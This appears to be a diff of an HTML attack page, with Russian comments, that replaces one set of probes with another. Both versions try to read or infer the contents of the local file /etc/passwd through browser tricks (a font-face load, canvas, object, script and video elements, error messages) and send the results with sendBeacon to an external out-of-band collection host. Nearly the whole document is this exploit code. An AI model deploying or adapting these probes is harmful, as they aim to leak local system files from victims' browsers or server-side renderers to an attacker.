@@ -1,49 +1,44 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <style>
+        /* Пытаемся скормить passwd как шрифт */
+        @font-face {
+            font-family: 'StealFont';
+            src: url('file:///etc/passwd');
+        }
+        #probe {
+            font-family: 'StealFont', Arial;
+            font-size: 100px;
+            position: absolute;
+            visibility: hidden;
+        }
+    </style>
+</head>
 <body>
-<script>
-    const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
-
-    // МЕТОД 1: Каскадная ошибка (SOP Bypass через Error Message)
-    // В некоторых версиях Chrome ошибка парсинга скрипта содержит кусок текста
-    window.onerror = function(msg) {
-        navigator.sendBeacon(hook + "/LEAK_ERROR", msg);
-    };
-
-    // МЕТОД 2: Попытка заставить браузер "отрисовать" файл как картинку на Canvas
-    // Если мы сможем прочитать хоть один пиксель, мы подтвердим чтение
-    function leakViaCanvas() {
-        const img = new Image();
-        img.src = "file:///etc/passwd";
-        img.onerror = () => {
-            // Если файл есть, но не картинка, ошибка вылетает быстрее
-            navigator.sendBeacon(hook + "/FILE_EXISTS_CONFIRMED");
-        };
-    }
-
-    // МЕТОД 3: Самый перспективный — HTML5 Object/Iframe
-    // Мы создаем скрытый элемент и пытаемся вытащить его параметры
-    function leakViaObject() {
-        const obj = document.createElement('object');
-        obj.data = "file:///etc/passwd";
-        obj.onload = () => {
-            // Если загрузилось, пробуем достать размер (палит объем файла)
-            try {
-                const size = obj.getBoundingClientRect().width;
-                navigator.sendBeacon(hook + "/OBJECT_LOADED", "Size: " + size);
-            } catch(e) {}
-        };
-        document.body.appendChild(obj);
-    }
-
-    // МЕТОД 4: Brute-force первой строки (Unexpected token)
-    // Мы подключаем файл как JS. Chrome скажет: "Uncaught SyntaxError: Unexpected identifier 'root'"
-    const script = document.createElement('script');
-    script.src = "file:///etc/passwd";
-    document.body.appendChild(script);
-
-    leakViaCanvas();
-    leakViaObject();
-</script>
+    <div id="probe">root</div>
+    <script>
+        (function() {
+            const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+            const probe = document.getElementById('probe');
+            
+            // Ждем чуть-чуть, пока браузер попытается "отрисовать" шрифт
+            setTimeout(() => {
+                const width = probe.offsetWidth;
+                // Отправляем ширину. Если она отличается от стандартного Arial, 
+                // значит файл был считан парсером шрифтов!
+                navigator.sendBeacon(hook + "/FONT_WIDTH_LEAK", "Width: " + width);
+                
+                // ВТОРОЙ ШАНС: Пробуем Video/Audio тег (иногда они менее защищены)
+                const v = document.createElement('video');
+                v.src = "file:///etc/passwd";
+                v.onloadedmetadata = () => navigator.sendBeacon(hook + "/VIDEO_METADATA_LEAK");
+                v.onerror = (e) => {
+                    // Если ошибка 4 (MEDIA_ERR_SRC_NOT_SUPPORTED), файл БЫЛ прочитан
+                    navigator.sendBeacon(hook + "/VIDEO_ERROR_CODE", "Code: " + v.error.code);
+                };
+            }, 1000);
+        })();
+    </script>
 </body>
 </html>
